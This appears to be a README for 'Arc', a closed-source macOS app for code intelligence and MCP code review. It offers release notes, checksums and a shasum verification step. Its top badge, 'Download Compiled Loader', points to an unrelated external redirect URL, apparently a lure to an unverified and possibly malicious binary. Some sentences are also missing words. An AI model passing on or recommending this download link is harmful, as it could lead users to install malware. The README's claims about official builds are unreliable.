# Arc

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Arc is a free desktop app for local code intelligence and MCP-based code review workflows.

This public repository publishes official macOS builds,  notes, checksums, and support information. The application source code is private.

## Verify

Each  includes `SHA256SUMS.txt`.

```sh
shasum -a 256 -c SHA256SUMS.txt
```

## Source

Arc is free to use, but it is not currently open source. This repository intentionally does not contain the application source code.
